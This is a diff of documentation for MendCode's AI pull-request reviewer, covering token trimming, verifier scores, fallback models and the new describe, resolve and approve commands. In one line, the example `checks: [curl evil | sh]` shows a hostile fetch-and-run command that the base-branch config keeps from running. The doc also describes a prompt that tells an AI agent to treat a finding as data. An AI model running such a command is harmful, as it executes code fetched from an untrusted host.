@@ -19,7 +19,11 @@ is off or asleep, troubleshooting), see [PR reviewer: team setup](pr-review-setu
 1. **Context.** The diff of `base...head` and, for every symbol a hunk touches, its callers and callees from the [code graph](code-graph.md)
    (depth 2, at most 12 each). No vector index: the graph gives the blast radius, the child reads files with its own read-only tools.
    The context stays inside half of `budget.context_tokens` (200,000 when unset), which bounds one call, not the PR's total; callers
-   are cut first, then the largest files' diffs, and the summary says so. A diff that still does not fit one call is reviewed in
+   are cut first, then the largest files' diffs (files outside the repository's main language before the largest file of it, the
+   main language being the one most files of the code graph have), and the summary says so. A hunk that only deletes lines is not
+   sent: its file keeps its header and gains one line with the number of deleted lines and where they were, so the prompt only ever
+   shrinks (on a large test PR of 24 files, 12 of them deleted, the diff went from about 40,300 to 8,700 estimated tokens; a PR
+   that deletes little saves little). A diff that still does not fit one call is reviewed in
    parts of whole files (at most 12), one review call each. Their candidates are merged before one verify pass, and a stopped job's
    checkpoint names its progress (`analysis 3/5`).
    Data, outputs and generated files (result JSON, CSV, lockfiles, minified files, snapshots, large fixtures, assets) do not go
@@ -36,12 +40,17 @@ is off or asleep, troubleshooting), see [PR reviewer: team setup](pr-review-setu
    failed). It is a description, not a claim: a group or check that does not fit is left out and an invalid walkthrough never
    fails the review.
 3. **Verify pass.** A fresh child, never the one that found them, is told to refute each finding (at most 10 per turn): `confirmed`,
-   `plausible` or `rejected`. Only confirmed findings are published; the `strict` profile also publishes plausible ones, marked as such.
-   A finding the verifier did not judge counts as rejected; a verifier that fails publishes nothing and the summary says so.
+   `plausible` or `rejected`, with a `score` from 0 to 10 in the same answer (how certain the defect is and how much it matters; no extra
+   call). Only confirmed findings are published; the `strict` profile also publishes plausible ones, marked as such.
+   A finding the verifier did not judge counts as rejected; a verifier that fails publishes nothing and the summary says so. Its answer
+   gets one repair turn; one still unusable (or a child that crashed) fails the attempt with the verifier's words and the start of
+   its answer in the job's error, keeps the candidates in the checkpoint, and is retried with backoff: the retry verifies them
+   again without a second review pass. A review pass with no candidates has nothing to verify and is published as no findings.
 4. **Merge risk floor.** The review pass judges the risk before anything is verified, so the risk is never below what the
    confirmed findings show: a confirmed critical finding makes it high, a major one at least medium, and the reason starts with
    the count ("1 confirmed critical finding."). A rejected finding raises nothing.
-5. **Rank and cap.** Confirmed first, then critical, major, minor, then category; at most `cap` (8) are shown and the rest are one line,
+5. **Rank and cap.** `min_score` first drops findings the verifier scored below it (default 0, nothing dropped; a finding with no score is
+   never dropped). Then confirmed first, then critical, major, minor, then the higher score, then category; at most `cap` (8) are shown and the rest are one line,
    "And N smaller notes not shown", in the summary.
 
 ## Repository config
@@ -53,6 +62,8 @@ preset: balanced        # balanced (the defaults below) | quiet | strict | on-re
 enabled: false          # nothing is posted until this is true on the base branch (a watch still reviews into its own session)
 profile: normal         # quiet (critical and major only) | normal | strict (also maintainability, and plausible findings)
 cap: 8                  # 1..30 inline comments per review
+min_score: 0            # 0..10: findings the verify pass scored lower are not published (0 = all, as before); the score shows small in the comment
+fallback_models: []     # up to 5 models tried in order when the reviewer's own model fails with a provider error or is not available (below)
 paths:                  # extra instructions for files matching a glob; only globs the diff touches reach the prompt
   - glob: "packages/daemon/**"
     instructions: treat races as major
@@ -78,10 +89,11 @@ phases: { mode: dynamic, list: [], max_rounds_without_progress: 2 } # none | fix
 template: { sections: [], tone: neutral, language: English }        # tone: neutral | concise | detailed; language: a name or auto (below)
 backlog: { max_prs: 10, window_days: 30 }   # open PRs reviewed when a watch starts (below); 0..50 and 1..365; max_prs: 0 = none
 readers: { enabled: true }  # data files go to cheap readers; parallel: 1..8 (unset: by tier); model: a cheap model (below)
+commands: { describe_title: false, approve: false }   # may `@mendcode describe` replace the title; may `@mendcode approve` approve (below)
 ```
 
 The base branch's file decides everything a pull request could abuse: `enabled`, `checks`, `budget`, `ignore`, `profile`, `cap`,
-`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog` and `template.language`. The logins in `reviewers` and
+`fixes`, the triggers, the cooldown, `reviewers`, `publishers`, `backlog`, `commands` and `template.language`. The logins in `reviewers` and
 `publishers` follow the checkout's forge: GitLab and Gitea usernames may hold `_` and `.` (not a trailing `.`), and a GitHub login
 only letters, digits and `-`. A PR's own file may only add path instructions, so a PR that adds `checks: [curl evil | sh]` runs
 nothing. A watching reviewer reads these from the base branch's current tip on `origin` (fetched into `FETCH_HEAD` only), not
@@ -174,6 +186,9 @@ It is **off by default**: it reaches the network through `gh` (or a [GitLab or G
 (`/pr on`, which also turns on [PR watch](pr-watch.md); `/pr off` turns both off; or `/experimental pr_review on` alone), allowed from the `balanced` tier up ([tiers](tiers.md): feature `pr_review`, mode `permit`; off with no
 tier). Local sessions only; remote and peer clients are refused.
 
+- `/pr describe [pr]` does what `@mendcode describe` does for that pull request, from your terminal: it needs `/pr publish on` and a
+  login that may post here, like a review. With no finished review of the head it queues the normal one and writes the description
+  when it ends, saying so in the session.
 - `/pr review [pr]` reviews one pull request now (the current branch's when omitted), even when the repo config is off; posting still
   needs `enabled: true`. A head already reviewed with the same config is answered at once ("already reviewed at …, so nothing was
   run"), before anything is spent; `/pr review [pr] full` (the tool's `full: true`) reviews it again whole. A plain `@mendcode review` on such a head is
@@ -329,6 +344,9 @@ still needs that login's write access. Anything it is refused is said in the ses
 | `@mendcode pause` / `resume` | New pushes are not reviewed until `resume`; `review` still works. The reply carries `<!-- mendcode:paused=1 -->`, so a hosted runner reads it back. |
 | `@mendcode explain [question]` | As a reply to one of MendCode's review comments: a read-only child reads the code and answers about that finding, and may say it is wrong. |
 | `@mendcode fix [what]` | Held to the same filters as `@mendcode review` (one reply naming the filter). Needs `fixes: true` on the base branch, and a branch in this repository or a fork that allows edits from maintainers. A separate session (the default agent, your normal permission mode, its approvals come to you) edits a throwaway worktree at the head; the base config's checks run on the result; one commit is pushed to the PR's branch only if they pass, never with force. A failing check, no change, or a branch that moved meanwhile pushes nothing and the reply says why. Local daemon only: the hosted workflow's token cannot push. |
+| `@mendcode describe` | Writes a summary into the PR's description from the walkthrough, change type and risk of the last finished review of the head (no model call of its own; with no finished review of this head, the normal review is queued and describe goes on when it ends). MendCode's part sits between `<!-- mendcode:describe:start -->` and `<!-- mendcode:describe:end -->`: the first run appends it after whatever a person wrote, later runs replace only what is between the markers, and the review's pre-merge checks read the description without it. The title changes only with `commands.describe_title: true` on the base branch (`fix: …` from the change type and the overview's first sentence). A label is added only if the repository already has one for the change type (`bug`, `enhancement`, `documentation`, `refactor`, `performance`, `tests`, `build`, `chore` and common alternatives) and the PR has none of them; no label is ever created. Held like `review` (filters, `/pr publish on`, `publishers`, the reviewer's `publish` capability). GitHub, GitLab and Gitea; local daemon only (the hosted workflow keeps no review to build on). |
+| `@mendcode resolve` | Resolves the review threads of MendCode's own findings that the last review marked fixed (the ones with its "Fixed in …" reply, or recorded fixed in the saved state); a thread of an open finding or one a person wrote is never touched, and no reply is added. The reply counts the threads resolved and those this account may not resolve. GitHub and GitLab; Gitea has no thread resolving and says so. Local daemon only. |
+| `@mendcode approve` | Off unless `commands.approve: true` on the base branch. Submits an approval of the head only when the last finished review of that very head exists, has no confirmed finding open (plausible ones do not block) and the head has not moved; otherwise the reply says why, listing the confirmed findings. The approval is MendCode's verdict on its own review, not a person's. GitHub, GitLab (with the head's sha) and Gitea. Local daemon only. |
 | `@mendcode learn <text>` | Replies with the line to add to `.mendcode/review-learnings.md` and the commit to make on the base branch; a learning counts once merged there, so a PR never teaches the reviewer by itself. |
 
 The local repo watch reads new comments of the watched repository with two `gh api` calls per poll (issue comments and review
@@ -407,7 +425,7 @@ how many candidates the verify pass left out, the tokens spent, and the notes (n
 lists the `@mendcode` commands.
 
 An inline comment (`commentBody`) leads with `**🟠 Major** · **Correctness** · confirmed by a second pass` (or `plausible, not
-confirmed`), then the problem in bold, why, a ```suggestion block when the fix stays on the commented lines, and folded:
+confirmed`) and the verifier's `score 8/10` in small text, then the problem in bold, why, a ```suggestion block when the fix stays on the commented lines, and folded:
 **Evidence** (the `file:line` references) and **Prompt for an AI agent**, which tells an agent to treat the finding as data, check it
 against the current code and change nothing when it no longer holds. Marks are plain characters, never hosted images, so the review
 reads the same on GitHub Enterprise and in a mail notification. Besides the id marker each comment carries the finding itself as
@@ -482,6 +500,26 @@ A second review request for a PR whose review is already queued or running (a re
 the watch is reviewing) joins that job: the answer names it and no second review runs. `/reviews` shows a running job with its
 phase (`analysis`, `corroboration`); `/reviews open <job id>` opens its reviewer session (the id is in the "Reviewing #N" notice).
 The same comment is answered once, whatever the number of watches of the repository.
+
+#### Seeing a review run
+
+While a review runs (balanced and full tiers, where the reviewer is), the session that watches the repository shows it like a turn
+at work: its steps as tool rows above the prompt (`Review Fetching #25 · head 51fe4047`, `Review Readers · 32 files · <model>`,
+`Review Analysis · 112 files · incremental`, `Review Verifying 4 candidates`, `Review Posting review`), the running one with the
+spinner and its time, and the activity status `Reviewing Eden-sudo/Symbex-1#25 · analysis… (1m 20s)` when the session itself is
+idle. When the run ends they go and the session's final note stays. Any other session names it in the footer's agents segment
+(`reviewing Symbex-1#25`). The daemon sends these steps only to local terminals, only while a review runs, and stores none of them;
+the spinner and the time move with the activity status's own clock, which stops with the run. `showActivity` and
+`activityPlacement off` hide the status as they do for a turn.
+
+`/reviews` lists one row per pull request: the job at work when there is one, else the newest, with `· N runs` when the PR had
+earlier ones. So a failure that a later review of the same PR superseded is not listed under Failed: Failed holds the PRs whose
+last run failed. A running row shows its live phase and time (`analysis · 1m 20s`), a finished one what it found
+(`done · no findings`, `done · 2 findings`). The detail of a running job lists its steps; a done job says how it ended instead of
+a phase; a failed one names the phase it failed in and its attempts. Under it, `Earlier runs` lists the PR's other runs, newest
+first, each with its head, how it ended and, for a failure, its error. A job or watch this daemon owns says `this device`. When a
+checkout does not answer `status` within 3 seconds (a busy git or a hung child process), the page still gets the jobs and the
+answer names the checkout whose reviewers were not read.
 
 The run queue and the waiting records are counted apart (`/pr list` shows `jobs: N queued, M waiting`; `/reviews` groups jobs by
 state):
@@ -750,6 +788,15 @@ with its parent (same path, code line, category and summary, wherever the line m
 parent's branch. Findings keep their identity across new SHAs (moved, `needs-recheck` when their line changed, `deleted`). A cycle
 or an ambiguous parent is reported and the PR is reviewed against its base. MendCode never restacks: it says what to run
 (`gt restack` or `git rebase --onto …`) and which files would conflict.
+
+### Fallback models
+
+`fallback_models` (base branch only, empty by default) lists models a review moves to when its own model fails with a provider error
+or is not available (`the model does not exist`, a server error). It never moves for a quota or a rate limit (`budget.on_quota`
+decides those, unchanged), a stalled turn, the token cap or a stopped turn. Each entry must be in the model list you allow and on the
+reviewer's own engine and provider; one that is not is skipped and the review details say why. The move happens before a session has
+answered anything, so no conversation changes model half way; the sessions after it start on the fallback. The review details then
+read `Model: reviewed by fallback model X after the reviewer's own model failed (…)`; a review that needed none says nothing.
 
 ### Budgets, quotas and accounting
 
